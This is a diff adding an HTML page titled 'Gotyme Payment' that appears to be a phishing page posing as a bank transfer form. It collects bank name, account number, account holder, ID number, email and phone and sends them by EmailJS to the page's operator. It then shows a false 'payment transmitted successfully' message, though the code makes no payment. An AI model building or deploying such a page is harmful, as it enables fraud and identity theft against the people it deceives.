@@ -1,0 +1,216 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Gotyme Payment</title>
+
+<style>
+* {
+    box-sizing: border-box;
+    margin: 0;
+    padding: 0;
+    font-family: Arial, sans-serif;
+}
+
+body {
+    background: #f4f6f9;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: 100vh;
+    padding: 20px;
+}
+
+.container {
+    width: 100%;
+    max-width: 460px;
+    background: #fff;
+    padding: 28px;
+    border-radius: 12px;
+    box-shadow: 0 10px 25px rgba(0,0,0,0.12);
+}
+
+.logo {
+    text-align: center;
+    margin-bottom: 18px;
+}
+
+.logo img {
+    width: 140px;
+    max-width: 100%;
+}
+
+h2 {
+    text-align: center;
+    margin-bottom: 8px;
+}
+
+.subtitle {
+    text-align: center;
+    color: #666;
+    margin-bottom: 22px;
+}
+
+input {
+    width: 100%;
+    height: 48px;
+    margin-bottom: 14px;
+    padding: 0 14px;
+    border: 1px solid #ccc;
+    border-radius: 8px;
+    font-size: 15px;
+}
+
+input:focus {
+    outline: none;
+    border-color: #007bff;
+}
+
+button {
+    width: 100%;
+    height: 48px;
+    border: none;
+    border-radius: 8px;
+    background: #e30909;
+    font-size: 16px;
+    font-weight: bold;
+    cursor: pointer;
+}
+
+button:hover {
+    background: #ddb000;
+}
+
+.status {
+    text-align: center;
+    margin-top: 12px;
+    font-weight: bold;
+}
+
+.modal {
+    display: none;
+    position: fixed;
+    inset: 0;
+    background: rgba(0,0,0,.5);
+    justify-content: center;
+    align-items: center;
+}
+
+.modal-box {
+    background: #fff;
+    width: 90%;
+    max-width: 340px;
+    padding: 30px;
+    border-radius: 12px;
+    text-align: center;
+}
+
+.check {
+    width: 70px;
+    height: 70px;
+    background: #28a745;
+    color: #fff;
+    border-radius: 50%;
+    margin: 0 auto 15px;
+    font-size: 40px;
+    line-height: 70px;
+}
+
+.modal-box button {
+    margin-top: 20px;
+    background: #28a745;
+    color: #fff;
+}
+
+@media(max-width:500px){
+    .container{
+        padding:20px;
+    }
+}
+</style>
+</head>
+<body>
+
+<div class="container">
+
+    <div class="logo">
+        <img src="https://img.sanishtech.com/u/be1cd10fdc886afdc7f6bf8d0f2ba374.jpg" alt="Logo">
+    </div>
+
+    <h2>Joseph Kamasho</h2>
+    <p class="subtitle">Please enter beneficiary's account details below.</p>
+
+    <form id="contactForm">
+
+        <input type="text" name="bank_name" placeholder="Bank Name" required>
+
+        <input type="email" name="email" placeholder="Email Address" required>
+
+        <input type="tel" name="mobile_number" placeholder="Mobile Number">
+
+        <input type="text" name="account_number" placeholder="Account Number">
+
+        <input type="text" name="account_holder" placeholder="Account Holder" required>
+
+        <input type="text" name="id_number" placeholder="ID Number">
+
+        <input type="text" name="reference_number" placeholder="Reference Number">
+
+        <button type="submit">Transfer Now</button>
+
+    </form>
+
+    <div id="status" class="status"></div>
+
+</div>
+
+<div id="successModal" class="modal">
+    <div class="modal-box">
+        <div class="check">✓</div>
+        <h3>Payment Submission Successful</h3>
+        <p>Your payment has been transmitted successfully.</p>
+        <button onclick="closeModal()">OK</button>
+    </div>
+</div>
+
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+
+<script>
+emailjs.init({
+    publicKey: "HpZzgRRDvMh4jOI0w"
+});
+
+const form = document.getElementById("contactForm");
+const status = document.getElementById("status");
+const modal = document.getElementById("successModal");
+
+form.addEventListener("submit", async function(e){
+    e.preventDefault();
+
+    status.textContent = "Please wait while we process your payment...";
+
+    try{
+        await emailjs.sendForm(
+            "service_gb8raxi",
+            "template_ycf23hq",
+            this
+        );
+
+        status.textContent = "";
+        form.reset();
+        modal.style.display = "flex";
+    }catch(error){
+        console.error(error);
+        status.textContent = "Submission failed.";
+    }
+});
+
+function closeModal(){
+    modal.style.display = "none";
+}
+</script>
+
+</body>
+</html>
